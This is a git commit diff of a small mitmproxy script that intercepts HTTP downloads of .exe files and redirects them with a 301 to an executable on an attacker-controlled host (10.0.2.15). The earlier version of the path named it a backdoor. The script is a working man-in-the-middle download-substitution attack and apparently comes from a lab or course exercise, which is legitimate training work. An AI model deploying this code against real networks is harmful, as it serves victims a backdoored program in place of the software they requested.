04a166076d70e0d52ec450cc8a51357757091e11
Atıl Samancıoğlu <samancioglu.atil@gmail.com>
2022-07-09 16:36:31 +0300

    minor revisions

--- flowresponsechanger.py
+++ flowresponsechanger.py
@@ -2,18 +2,10 @@ import mitmproxy
 
 def request(flow):
 	if flow.request.host != "10.0.2.15" and flow.request.pretty_url.endswith(".exe"):
-		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location" : "http://10.0.2.15/backdoors/installation.exe"})
+		flow.response = mitmproxy.http.Response.make(301, "", {"Location" : "http://10.0.2.15/installation.exe"})
 		
-		
-		
-		#1=HTTP STATUS CODE = 301
-		#2=CONTENT (icerik)
-		#3=HEADERS (yeni dosyanin konumunu)
-		#print("burada bir exe dosyasi yakaladik")
-		#print(flow.request.pretty_url)
-
 
 #def response(flow):
-#	print("burasi cevaplari veriyor")
+#	print("response....")
 #	print(flow)
 
